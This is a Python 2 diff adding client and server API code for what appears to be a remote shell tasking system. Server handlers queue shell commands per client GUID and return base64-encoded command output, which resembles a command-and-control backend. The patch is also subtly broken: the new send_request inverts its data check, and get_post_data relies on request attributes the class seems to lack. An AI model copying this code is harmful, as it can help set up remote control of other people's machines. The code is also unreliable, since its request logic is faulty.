@@ -6,6 +6,7 @@ from core.utils import Utils
 import urllib2
 import hashlib
 import json
+import base64
 
 class CliApi:
     
@@ -31,16 +32,23 @@ class CliApi:
         return self.send_get_request("%s/api/list" % self.server)
     
     def send_get_request(self, url):
+        return self.send_request(url)
+        
+    def send_post_request(self, url, data):
+        return self.send_request(url, data)
+               
+    def send_request(self, url, data=None):
         request = urllib2.Request(url)
         request.add_header("Authorization", self.config["password"])
         request.add_header("X-Client-Version", self.config["version"])
         
         try:
-            return json.loads(urllib2.urlopen(request).read())
+            if data == None:
+                return json.loads(urllib2.urlopen(request, json.dumps(data)).read())
+            else:
+                return json.loads(urllib2.urlopen(request).read())
         except:
-            
-            return False
-        
+            return False               
 class ServerApi:
     
     def __init__(self, config, request):
@@ -88,6 +96,23 @@ class ServerApi:
     def get_shell_output(self):
         if self.auth():
             try:
-                shell_id = self.request.path.split("/")[3]
+                guid = self.request.path.split("/")[3]
+                guid = Utils.validate_guid(guid)
+                self.output["data"] = base64.b64encode(self.db.get_cmd(guid))
             except:
                 return 
+            
+    def send_shell_cmd(self):
+        if self.auth():
+            try:
+                guid = self.request.path.split("/")[3]
+                guid = Utils.validate_guid(guid)
+                self.db.push_cmd(guid, self.get_post_data())
+            except:
+                return
+            
+    def get_post_data(self):
+        length = 0
+        if not self.headers.getheader("Content-Length") == None:
+            length = int(self.headers.getheader("Content-Length"))
+        return self.rfile.read(length)
